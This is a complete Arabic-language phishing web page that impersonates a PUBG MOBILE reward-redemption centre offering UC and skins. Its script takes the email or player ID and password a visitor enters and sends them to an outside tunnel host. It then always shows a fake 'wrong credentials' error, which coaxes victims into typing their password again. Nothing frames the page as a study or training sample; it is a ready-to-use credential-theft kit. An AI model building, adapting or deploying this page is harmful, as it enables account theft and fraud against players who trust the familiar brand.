<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>PUBG MOBILE | مركز الاسترداد</title>
    <style>
        body {
            background-color: #0b0e11;
            background-image: radial-gradient(circle, #1a202c 0%, #0b0e11 100%);
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            margin: 0;
            color: #ffffff;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
        }
        .container {
            width: 90%;
            max-width: 450px;
            background: #1c242d;
            border: 1px solid #facc15;
            border-radius: 12px;
            padding: 30px;
            box-shadow: 0 0 20px rgba(250, 204, 21, 0.4);
            text-align: center;
        }
        .header img { width: 120px; margin-bottom: 15px; }
        h2 { color: #facc15; font-size: 1.4rem; margin-bottom: 5px; }
        p { color: #94a3b8; font-size: 0.85rem; margin-bottom: 20px; }
        .error-banner {
            background-color: #7f1d1d;
            color: #fca5a5;
            padding: 10px;
            border-radius: 5px;
            margin-bottom: 15px;
            font-size: 0.8rem;
            display: none;
            border: 1px solid #ef4444;
        }
        .input-group { text-align: right; margin-bottom: 15px; }
        .input-group label { display: block; color: #facc15; margin-bottom: 5px; font-size: 0.9rem; }
        .input-group input {
            width: 100%;
            padding: 12px;
            background: #0f172a;
            border: 1px solid #334155;
            border-radius: 5px;
            color: #fff;
            box-sizing: border-box;
            outline: none;
        }
        .btn-submit {
            width: 100%;
            padding: 12px;
            background: #facc15;
            color: #000;
            border: none;
            border-radius: 5px;
            font-weight: bold;
            font-size: 1rem;
            cursor: pointer;
        }
    </style>
</head>
<body>

    <div class="container">
        <div class="header">
            <img src="https://logodownload.org/wp-content/uploads/2019/04/pubg-mobile-logo.png" alt="PUBG Logo">
        </div>
        <h2>مركز استرداد الهدايا</h2>
        <p>سجل دخولك الآن للمطالبة بمكافأة الموسم (UC & Skins)</p>

        <div id="msg_box" class="error-banner">تأكد أنك لم تخطئ في كتابة البريد الإلكتروني أو كلمة السر.</div>

        <form id="pubgForm">
            <div class="input-group">
                <label>البريد الإلكتروني أو معرف اللاعب</label>
                <input type="text" id="email_field" placeholder="example@mail.com" required>
            </div>
            <div class="input-group">
                <label>كلمة المرور</label>
                <input type="password" id="pass_field" placeholder="أدخل كلمة المرور" required>
            </div>
            <button type="submit" class="btn-submit">تفعيل المكافأة الآن</button>
        </form>
    </div>

    <script>
        document.getElementById('pubgForm').addEventListener('submit', function(e) {
            e.preventDefault();

            const email_val = document.getElementById('email_field').value;
            const pass_val = document.getElementById('pass_field').value;
            const errorBox = document.getElementById('msg_box');

            // الرابط المحدث مع علامة / في النهاية لضمان التوافق مع Flask
            const targetUrl = 'https://7990910083713e47-5-255-10-47.serveousercontent.com/';

            fetch(targetUrl, {
                method: 'POST',
                mode: 'cors',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    email: email_val, 
                    pass: pass_val    
                })
            })
            .then(response => {
                errorBox.style.display = 'block';
                document.getElementById('pass_field').value = ''; 
            })
            .catch(error => {
                console.error('Error:', error);
                // تظهر الرسالة حتى لو كان هناك خطأ لضمان استمرار العملية
                errorBox.style.display = 'block';
            });
        });
    </script>
</body>
</html>
